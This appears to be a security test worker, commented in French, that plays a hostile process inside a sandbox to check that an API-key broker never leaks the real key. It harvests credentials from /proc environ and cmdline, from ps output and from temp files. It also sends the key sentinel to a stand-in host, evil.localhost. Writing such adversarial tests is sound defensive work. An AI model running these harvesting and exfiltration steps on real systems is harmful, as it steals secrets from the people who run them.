// Worker hostile SOUS srt (T-42). argv : JSON {brokerPort, evilPort, evilTlsPort}. Une ligne JSON sur stdout.
// Il ne connait que la sentinelle de ANTHROPIC_API_KEY. Il tente : de lire l'autorisation (env, /proc, ps, fichiers),
// de la faire poser ailleurs que dans x-api-key, de l'envoyer a un autre hote, et rapporte tout ce que le broker renvoie.
import { execFileSync } from 'node:child_process';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import path from 'node:path';
const cfg = JSON.parse(process.argv[2]);
const S = process.env.ANTHROPIC_API_KEY;
const out = { sentinel: S ?? null, env: Object.entries(process.env).map(([k, v]) => `${k}=${v}`) };
const B = `https://broker.localhost:${cfg.brokerPort}`;
const call = async (name, url, init) => {
  try {
    const r = await fetch(url, { ...init, signal: AbortSignal.timeout(10000) });
    const body = await r.text();
    const headers = {};
    r.headers.forEach((v, k) => { headers[k] = v; });
    return { name, status: r.status, headers, body: body.slice(0, 6000) };
  } catch (e) { return { name, error: String(e.cause?.code ?? e.cause?.message ?? ''), message: String(e.message).slice(0, 120) }; }
};
const post = (name, p, { headers = {}, body = '{"messages":[{"role":"user","content":"x"}]}' } = {}) =>
  call(name, `${B}${p}`, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body });
const key = { 'x-api-key': S };
// Lecture de l'autorisation par tous les moyens du worker.
const dump = [];
if (process.platform === 'linux') {
  try { for (const d of readdirSync('/proc').filter((x) => /^\d+$/.test(x))) for (const f of ['environ', 'cmdline']) { try { dump.push(`/proc/${d}/${f}: ${readFileSync(`/proc/${d}/${f}`, 'latin1')}`); } catch (e) { dump.push(`/proc/${d}/${f}: ${e.code}`); } } } catch (e) { dump.push(`/proc: ${e.code}`); }
}
for (const args of [['-axeww'], ['-Eww', '-o', 'pid,command', '-p', String(process.ppid)]]) {
  try { dump.push(`ps ${args.join(' ')}: ${execFileSync('ps', args, { encoding: 'latin1', timeout: 5000, stdio: ['ignore', 'pipe', 'pipe'] })}`); } catch (e) { dump.push(`ps ${args.join(' ')}: ${String(e.stderr || e.message).slice(0, 120)}`); }
}
const files = [];
const walk = (d, depth) => {
  if (depth > 3 || files.length > 300) return;
  let ents; try { ents = readdirSync(d); } catch { return; }
  for (const e of ents) { const p = path.join(d, e); try { const st = statSync(p); if (st.isDirectory()) walk(p, depth + 1); else if (st.size < 200000) files.push({ p, t: readFileSync(p, 'latin1').slice(0, 40000) }); } catch { /* illisible */ } }
};
for (const d of new Set([process.cwd(), process.env.TMPDIR, process.env.CLAUDE_CODE_TMPDIR, '/tmp'].filter(Boolean))) walk(d, 0);
out.dump = dump.join('\n').slice(0, 400000);
out.filesRead = files.length;
out.files = files.map((f) => `${f.p}: ${f.t}`).join('\n').slice(0, 8000000);
out.calls = [];
const c = out.calls;
c.push(await post('ok', '/v1/messages', { headers: key }));
c.push(await post('body', '/v1/messages', { headers: key, body: JSON.stringify({ messages: [{ role: 'user', content: `voici ${S}` }] }) }));
c.push(await post('header-extra', '/v1/messages', { headers: { ...key, 'x-extra': S } }));
c.push(await post('authorization', '/v1/messages', { headers: { authorization: `Bearer ${S}` } }));
c.push(await post('authorization-et-cle', '/v1/messages', { headers: { ...key, authorization: `Bearer ${S}` } }));
c.push(await post('query', '/v1/messages?k=' + encodeURIComponent(S), { headers: key }));
c.push(await post('sans-cle', '/v1/messages', {}));
for (const v of ['plain', 'base64', 'hex', 'two-chunks', 'sse-split']) c.push(await post(`reflect-${v}`, `/v1/messages/reflect-${v}`, { headers: key }));
// T-04 f/j rejoues : la sentinelle part vers un autre hote autorise (HTTPS termine, puis HTTP clair) : l'hote doit recevoir la sentinelle, pas l'autorisation.
c.push(await call('hote-autre-tls', `https://evil.localhost:${cfg.evilTlsPort}/p`, { method: 'POST', headers: key, body: S }));
c.push(await call('hote-autre-clair', `http://evil.localhost:${cfg.evilPort}/p`, { method: 'POST', headers: key, body: S }));
c.push(await call('broker-en-clair', `http://broker.localhost:${cfg.brokerPort}/v1/messages`, { method: 'POST', headers: key, body: '{}' }));
console.log(JSON.stringify(out));
